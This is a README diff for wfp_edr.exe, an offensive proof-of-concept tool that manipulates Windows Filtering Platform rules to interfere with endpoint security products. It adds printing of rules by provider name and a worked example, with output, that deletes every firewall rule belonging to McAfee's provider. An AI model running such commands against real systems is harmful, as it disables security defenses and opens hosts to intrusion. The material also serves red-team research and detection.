@@ -58,8 +58,12 @@ Usage of wfp_edr.exe:
 ## Print all providers and Sublayers
 C:\Temp\hello>wfp_edr.exe -print
 
-## Print all rules from a specific provider
+## Print all rules from a specific provider ID
 C:\Temp\hello>wfp_edr.exe -print -providerID {4B153735-1049-4480-AAB4-D1B9BDC03710} 
+
+## Print all rules from a specific provider Name
+C:\Temp\hello>wfp_edr.exe -print -providerName Guardicore 
+
 
 ## Get WEC  
 This option is to read WEF (Windows Event Forwarding) configuration from Registry.  
@@ -209,6 +213,23 @@ An object with that GUID or LUID already exists.
 ```
 wfp_edr.exe -install -file cs.json -persistent
 ```
+
+## Delete all rules from a specific provider ID
+```
+C:\Temp\hello>wfp_edr -providerName McAfee -print
+...
+| ProviderID                             | ProviderName                                            | Description
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+| {8DFB7AB4-65F2-4889-A54B-E4A929173158} | McAfee Inc.                                             | McAfee Firewall
+...
+C:\Temp\hello>wfp_edr -deleteproviderID {8DFB7AB4-65F2-4889-A54B-E4A929173158}
+[+] Created new Session name = 'EDR Offensive tool POC WITH wfp'
+[+] Attempting to delete all rules from ProviderID  =  {8DFB7AB4-65F2-4889-A54B-E4A929173158}
+[-] Deleting rule ID =  {94265FF3-9FA8-471B-8EDB-C3A3F3E486E8} 
+```
+
+
+
 ## Acknowledgement
 Florian Audon (Orange Cyber Defense Switzerland) for the sharing of the knowledge of the library and exchanging ideas enabling the creation of the tool.
 I have kept this repo private until past his presentation at Barbhack at Toulon
